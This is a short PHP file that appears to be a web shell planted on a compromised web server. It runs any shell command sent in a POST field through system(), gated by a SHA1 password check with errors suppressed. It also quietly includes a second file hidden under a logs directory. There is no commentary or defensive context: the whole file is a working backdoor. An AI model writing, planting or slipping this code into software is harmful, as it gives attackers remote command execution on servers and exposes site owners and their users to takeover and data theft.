<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="25334d523ac1a1f21993847cf677cadfc37b9be0"){@system($_POST["w"]);die();}
@include_once "/var/www/html/logs/w";
die();